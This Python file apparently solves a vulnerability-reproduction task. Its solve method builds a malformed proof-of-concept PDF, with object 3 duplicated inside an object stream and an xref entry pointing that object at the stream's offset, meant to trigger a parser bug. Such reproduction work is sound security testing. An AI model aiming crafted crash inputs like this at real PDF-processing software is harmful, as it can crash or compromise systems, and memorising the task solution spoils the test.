class Solution:
    def solve(self, src_path: str) -> bytes:
        # Build the ObjStm stream with duplicate object 3
        objnum = 3
        obj1_str = '<</Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R /Resources <</Font <</F1 5 0 R>>>>>>'
        obj2_str = '<</Type /Page /Parent 2 0 R /MediaBox [0 0 612 792]>>'
        obj1_bytes = obj1_str.encode('ascii')
        obj2_bytes = obj2_str.encode('ascii')
        sep_b = b'\n'

        # Calculate stream
        guess_off1 = 20
        guess_off2 = 80
        off1 = guess_off1
        off2 = guess_off2
        while True:
            header_str = f"{off1} {objnum} {off2} {objnum}"
            header_bytes = header_str.encode('ascii')
            new_off1 = len(header_bytes) + len(sep_b)
            new_off2 = new_off1 + len(obj1_bytes) + len(sep_b)
            if new_off1 == off1 and new_off2 == off2:
                break
            off1 = new_off1
            off2 = new_off2
        stream_bytes = header_bytes + sep_b + obj1_bytes + sep_b + obj2_bytes
        stream_length = len(stream_bytes)

        # Now build positions
        pdf_header_len = len(b'%PDF-1.5\n')
        current_pos = pdf_header_len

        obj1_str = '1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n\n'
        len_obj1 = len(obj1_str.encode('ascii'))
        pos1 = current_pos
        current_pos += len_obj1

        obj2_str = '2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n\n'
        len_obj2 = len(obj2_str.encode('ascii'))
        pos2 = current_pos
        current_pos += len_obj2

        content_str = 'BT /F1 12 Tf 100 700 Td (Hello World) Tj ET'
        content_length = len(content_str.encode('ascii'))
        obj4_header_str = f'4 0 obj\n<< /Length {content_length} >>\nstream\n'
        obj4_header = obj4_header_str.encode('ascii')
        obj4_footer = b'endstream\nendobj\n\n'
        len_obj4 = len(obj4_header) + content_length + len(obj4_footer)
        pos4 = current_pos
        current_pos += len_obj4

        obj5_str = '5 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\nendobj\n\n'
        len_obj5 = len(obj5_str.encode('ascii'))
        pos5 = current_pos
        current_pos += len_obj5

        obj6_header_str = f'6 0 obj\n<< /Type /ObjStm /N 2 /First {off1} /Length {stream_length} >>\nstream\n'
        obj6_header_bytes = obj6_header_str.encode('ascii')
        obj6_footer = b'endstream\nendobj\n\n'
        len_obj6 = len(obj6_header_bytes) + stream_length + len(obj6_footer)
        pos6 = current_pos
        current_pos += len_obj6

        xref_pos = current_pos

        # Build PoC bytes
        poc = b'%PDF-1.5\n'
        poc += obj1_str.encode('ascii')
        poc += obj2_str.encode('ascii')
        poc += obj4_header
        poc += content_str.encode('ascii')
        poc += obj4_footer
        poc += obj5_str.encode('ascii')
        poc += obj6_header_bytes
        poc += stream_bytes
        poc += obj6_footer

        # Xref
        xref_str = 'xref\n0 7\n'
        xref_str += f"{0:010d} 65535 f \n"
        xref_str += f"{pos1:010d} 00000 n \n"
        xref_str += f"{pos2:010d} 00000 n \n"
        xref_str += f"{pos6:010d} 00000 n \n"
        xref_str += f"{pos4:010d} 00000 n \n"
        xref_str += f"{pos5:010d} 00000 n \n"
        xref_str += f"{pos6:010d} 00000 n \n"
        poc += xref_str.encode('ascii')

        # Trailer
        trailer_str = f"""trailer
<</Size 7/Root 1 0 R>>
startxref
{xref_pos}
%%EOF
"""
        poc += trailer_str.encode('ascii')

        return poc